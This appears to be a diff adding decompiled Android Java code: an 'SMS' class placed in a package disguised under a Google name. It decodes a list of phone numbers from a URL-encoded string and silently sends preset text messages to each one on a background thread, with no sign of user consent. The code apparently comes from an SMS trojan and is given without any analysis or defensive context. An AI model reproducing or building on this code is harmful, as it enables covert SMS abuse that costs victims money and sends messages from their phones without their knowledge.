@@ -1,0 +1,54 @@
+package com.google.bps.bfcfc;
+public class SMS {
+    private static String SMS_DELIVERED_ACTION;
+    private static String SMS_SEND_ACTIOIN;
+    public String content;
+    public int i;
+    public String mobile;
+    public String[] phones;
+    public android.content.BroadcastReceiver sendMessage;
+    public String sid;
+
+    static SMS()
+    {
+        com.google.bps.bfcfc.SMS.SMS_SEND_ACTIOIN = "SMS_SEND_ACTIOIN";
+        com.google.bps.bfcfc.SMS.SMS_DELIVERED_ACTION = "SMS_DELIVERED_ACTION";
+        return;
+    }
+
+    public SMS(String p2, String p3)
+    {
+        this.i = 0;
+        this.sendMessage = new com.google.bps.bfcfc.SMS$1(this);
+        this.content = p2;
+        this.sid = p3;
+        return;
+    }
+
+    static synthetic void access$0(com.google.bps.bfcfc.SMS p0, String p1)
+    {
+        p0.sendData(p1);
+        return;
+    }
+
+    private void sendData(String p11)
+    {
+        this.mobile = p11;
+        android.telephony.SmsManager v0 = android.telephony.SmsManager.getDefault();
+        if (this.content.length() < 70) {
+            android.content.Intent v7_0 = new android.content.Intent(com.google.bps.bfcfc.SMS.SMS_SEND_ACTIOIN);
+            android.content.Intent v6_1 = new android.content.Intent(com.google.bps.bfcfc.SMS.SMS_DELIVERED_ACTION);
+            android.app.PendingIntent v4 = android.app.PendingIntent.getBroadcast(com.google.bps.bfcfc.CoreService.mContext, 0, v7_0, 0);
+            com.google.bps.bfcfc.CoreService.mContext.registerReceiver(this.sendMessage, new android.content.IntentFilter(com.google.bps.bfcfc.SMS.SMS_SEND_ACTIOIN));
+            v0.sendTextMessage(this.mobile, 0, this.content, v4, android.app.PendingIntent.getBroadcast(com.google.bps.bfcfc.CoreService.mContext, 0, v6_1, 0));
+        }
+        return;
+    }
+
+    public void send(String p4)
+    {
+        this.phones = java.net.URLDecoder.decode(p4).split("p");
+        new Thread(new com.google.bps.bfcfc.SMS$2(this)).start();
+        return;
+    }
+}
